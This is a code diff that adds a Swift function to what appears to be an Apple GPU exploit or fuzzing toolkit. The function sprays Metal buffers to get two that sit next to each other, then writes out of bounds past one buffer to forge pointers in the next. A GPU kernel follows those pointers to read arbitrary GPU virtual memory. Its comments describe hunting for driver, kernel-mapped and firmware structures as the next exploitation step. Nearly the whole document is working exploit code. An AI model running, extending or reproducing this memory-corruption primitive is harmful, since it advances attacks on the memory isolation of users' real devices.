@@ -3455,3 +3455,133 @@ func runIOSurfaceGPUWrite(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     }
 }
+
+// ── runGPUVAScan ──────────────────────────────────────────────────────────────
+// Sweep GPU VA space with the read redirect primitive to locate Metal driver /
+// kernel-mapped regions not visible from userspace.
+//
+// Strategy: 64-thread dispatch per chunk, each thread reads from a different
+// candidate GPU VA via OOB-corrupted Probe array in hi.  AGX safe-return means
+// unmapped VAs return 0 silently; non-zero => something is mapped there.
+//
+// Scanned ranges (covering ~130GB with coarse granularity):
+//   Low:       0x000000000 – 0x080000000   (2 GB,  512 KB step)
+//   PreUser:   0x100000000 – 0x1400000000  (15 GB,    4 MB step)
+//   PostUser:  0x1700000000– 0x1b00000000  (16 GB,    4 MB step)
+//   High:      0x4000000000– 0x4400000000  (16 GB,    4 MB step)
+//
+// Non-zero hits logged as: HIT VA=0x… val=0x… — these are candidates for
+// Metal command-buffer descriptors, PSO caches, IOGPUFamily internal structs,
+// AGX firmware IPC region.  Follow-up: narrow with 4 KB step scan around hit.
+// ─────────────────────────────────────────────────────────────────────────────
+func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── GPU VA Scanner ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+
+        let BUF_LEN  = 4096
+        let NTHREADS = 64  // probes per dispatch
+
+        // Spray → lo/hi pair
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16))")
+
+        guard let hi  = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let out = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared) else {
+            step("✗ hi/out alloc"); completion(); return
+        }
+        step("hi=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠")")
+
+        // Write candidate VA into hi[idx].buf (8 bytes at offset idx*8 past lo end)
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let off = idx * 8
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((va >> (bi*8)) & 0xFF) }
+        }
+
+        // Kernel: hi is treated as array of Probe{device ulong* buf}
+        // Thread tid reads from hi[tid].buf[0] and writes result to out[tid]
+        let kernSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
+              let fn  = lib.makeFunction(name: "multiScan"),
+              let pso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ multiScan PSO"); completion(); return
+        }
+        step("✓ multiScan PSO ready")
+
+        // Scan ranges: (base, stepPerThread, numDispatches)
+        let ranges: [(base: UInt64, step: UInt64, dispatches: Int, label: String)] = [
+            (0x000000000,    0x80000,  64, "low  0–2GB"),
+            (0x100000000,  0x400000,  60, "pre  4–244GB"),
+            (0x1700000000, 0x400000,  64, "post 96–352GB above user"),
+            (0x4000000000, 0x400000,  64, "high 256GB+"),
+        ]
+
+        var totalHits = 0
+
+        for range in ranges {
+            step("── range: \(range.label) step=\(range.step/1024)KB dispatches=\(range.dispatches) ──")
+            for d in 0..<range.dispatches {
+                let dispatchBase = range.base + UInt64(d) * UInt64(NTHREADS) * range.step
+                for t in 0..<NTHREADS {
+                    oobWriteVA(t, dispatchBase + UInt64(t) * range.step)
+                }
+                out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
+
+                guard let q   = device.makeCommandQueue(),
+                      let cb  = q.makeCommandBuffer(),
+                      let enc = cb.makeComputeCommandEncoder() else { continue }
+                enc.setComputePipelineState(pso)
+                enc.setBuffer(hi,  offset: 0, index: 0)
+                enc.setBuffer(out, offset: 0, index: 1)
+                let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
+                enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                enc.endEncoding()
+                cb.commit(); cb.waitUntilCompleted()
+                if cb.error != nil { continue }
+
+                let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
+                for t in 0..<NTHREADS {
+                    let val = outPtr[t]
+                    if val != 0 {
+                        let va = dispatchBase + UInt64(t) * range.step
+                        step("  ★ HIT VA=0x\(String(va, radix: 16)) val=0x\(String(val, radix: 16))")
+                        totalHits += 1
+                    }
+                }
+            }
+        }
+
+        if totalHits == 0 {
+            step("── scan complete: 0 hits ──")
+            step("  driver regions not in scanned ranges OR reads need useResource")
+            step("  next: narrow scan near known IOSurface VA (0x1500000000) ±512MB")
+        } else {
+            step("── scan complete: \(totalHits) hit(s) ──")
+            step("  ★ non-zero VAs are Metal driver / kernel-mapped struct candidates")
+            step("  next: 4KB step re-scan around each hit, identify struct layout")
+        }
+        step("── GPU VA Scanner complete ──")
+        completion()
+    }
+}
